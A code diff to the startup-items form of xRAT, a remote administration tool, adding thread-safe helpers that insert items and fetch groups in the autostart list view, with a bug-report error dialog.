@@ -1,4 +1,5 @@
-﻿using System.Linq;
+﻿using System;
+using System.Linq;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.Misc;
@@ -86,9 +87,47 @@ namespace xServer.Forms
 
             if (modified > 0 && _connectClient != null)
             {
-                new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
                 lstStartupItems.Items.Clear();
+                new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
             }
+        }
+
+        public void AddAutostartItemToListview(ListViewItem lvi)
+        {
+            try
+            {
+                lstStartupItems.Invoke((MethodInvoker) delegate
+                {
+                    lstStartupItems.Items.Add(lvi);
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(
+                    string.Format(
+                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
+                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        public ListViewGroup GetGroup(int group)
+        {
+            ListViewGroup g = null;
+            try
+            {
+                lstStartupItems.Invoke((MethodInvoker) delegate
+                {
+                    g = lstStartupItems.Groups[group];
+                });
+            }
+            catch (InvalidOperationException)
+            {
+                return null;
+            }
+            return g;
         }
 
         private void lstStartupItems_ColumnClick(object sender, ColumnClickEventArgs e)
